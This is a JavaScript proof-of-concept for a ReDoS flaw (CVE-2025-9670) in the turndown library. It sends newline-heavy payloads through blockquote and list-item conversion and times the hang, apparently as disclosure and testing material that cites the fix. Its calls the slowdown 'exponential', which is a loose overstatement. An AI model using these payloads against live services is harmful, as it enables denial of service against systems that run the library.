/**
 * CVE-2025-9670 - ReDoS Proof of Concept
 *
 * This PoC demonstrates the Regular Expression Denial of Service (ReDoS)
 * vulnerability in mixmark-io turndown v7.2.0 and v7.2.1.
 *
 * The vulnerable regex patterns are:
 * 1. In blockquote rule: /^\n+|\n+$/g
 * 2. In listItem rule: /\n+$/
 *
 * These patterns suffer from catastrophic backtracking when given specially
 * crafted inputs containing many newlines followed by a non-newline character.
 */

const TurndownService = require('turndown');

// Test payload sizes
const SMALL_PAYLOAD = 1000;   // Should be fast
const MEDIUM_PAYLOAD = 10000; // Noticeable delay
const LARGE_PAYLOAD = 100000; // Severe delay / hang

/**
 * Test 1: Direct regex test (independent of turndown)
 * This shows the vulnerability exists in the regex pattern itself.
 */
function testRawRegex() {
    console.log('=== Test 1: Raw Regex Vulnerability ===');

    // The vulnerable pattern from blockquote rule
    const vulnerablePattern = /^\n+|\n+$/g;

    // Create attack string: many newlines followed by a non-newline character
    // This causes the regex engine to backtrack exponentially
    const attackString = '\n'.repeat(SMALL_PAYLOAD) + '!';

    console.log(`Payload size: ${attackString.length} characters`);
    console.log('Testing regex /^\\n+|\\n+$/g...');

    const start = Date.now();
    attackString.replace(vulnerablePattern, '');
    const elapsed = Date.now() - start;

    console.log(`Time elapsed: ${elapsed}ms`);
    console.log(elapsed > 100 ? 'VULNERABLE - Regex took too long!' : 'Fast (small payload)');
    console.log();
}

/**
 * Test 2: Blockquote ReDoS via turndown
 * The blockquote rule uses: content.replace(/^\n+|\n+$/g, '')
 */
function testBlockquoteRedos() {
    console.log('=== Test 2: Blockquote ReDoS ===');

    const turndownService = new TurndownService();

    // Create HTML with blockquote containing malicious content
    // The content inside blockquote will have many newlines followed by non-newline
    const newlines = '\n'.repeat(SMALL_PAYLOAD);
    const maliciousHtml = `<blockquote>${newlines}!</blockquote>`;

    console.log(`HTML payload length: ${maliciousHtml.length} characters`);
    console.log('Converting blockquote with malicious content...');

    const start = Date.now();
    try {
        turndownService.turndown(maliciousHtml);
        const elapsed = Date.now() - start;
        console.log(`Time elapsed: ${elapsed}ms`);
        console.log(elapsed > 100 ? 'VULNERABLE!' : 'Fast (small payload)');
    } catch (e) {
        console.log(`Error: ${e.message}`);
    }
    console.log();
}

/**
 * Test 3: List Item ReDoS via turndown
 * The listItem rule uses: content.replace(/\n+$/, '\n')
 */
function testListItemRedos() {
    console.log('=== Test 3: List Item ReDoS ===');

    const turndownService = new TurndownService();

    // Create HTML with list item containing malicious content
    const newlines = '\n'.repeat(SMALL_PAYLOAD);
    // Using a unicode character that won't match \n
    const maliciousHtml = `<ul><li>${newlines}\u25ce</li></ul>`;

    console.log(`HTML payload length: ${maliciousHtml.length} characters`);
    console.log('Converting list item with malicious content...');

    const start = Date.now();
    try {
        turndownService.turndown(maliciousHtml);
        const elapsed = Date.now() - start;
        console.log(`Time elapsed: ${elapsed}ms`);
        console.log(elapsed > 100 ? 'VULNERABLE!' : 'Fast (small payload)');
    } catch (e) {
        console.log(`Error: ${e.message}`);
    }
    console.log();
}

/**
 * Test 4: Demonstrate exponential time increase
 */
function testExponentialGrowth() {
    console.log('=== Test 4: Exponential Time Growth ===');

    const vulnerablePattern = /^\n+|\n+$/g;
    const sizes = [100, 500, 1000, 2000, 5000];

    console.log('Showing time increase as payload grows:');
    console.log('(Times >1000ms indicate severe vulnerability)');
    console.log();

    for (const size of sizes) {
        const attackString = '\n'.repeat(size) + '!';

        const start = Date.now();
        attackString.replace(vulnerablePattern, '');
        const elapsed = Date.now() - start;

        console.log(`  ${size.toString().padStart(5)} newlines: ${elapsed}ms`);

        // Safety: stop if taking too long
        if (elapsed > 5000) {
            console.log('  (Stopping early - times are becoming too long)');
            break;
        }
    }
    console.log();
}

// Run all tests
console.log('CVE-2025-9670 ReDoS Vulnerability PoC');
console.log('=====================================');
console.log('Target: mixmark-io/turndown v7.2.0, v7.2.1');
console.log('File: src/commonmark-rules.js');
console.log('CWE: CWE-1333 (Inefficient Regular Expression Complexity)');
console.log();

testRawRegex();
testBlockquoteRedos();
testListItemRedos();
testExponentialGrowth();

console.log('=== Summary ===');
console.log('The vulnerability exists in two regex patterns:');
console.log('1. /^\\n+|\\n+$/g - used in blockquote rule');
console.log('2. /\\n+$/ - used in listItem rule');
console.log();
console.log('The \\n+$ pattern causes catastrophic backtracking when:');
console.log('- Input has many newline characters');
console.log('- Followed by a non-newline character');
console.log('- The $ anchor cannot match');
console.log();
console.log('Fix: Replace regex with iterative trimming (see v7.2.2)');
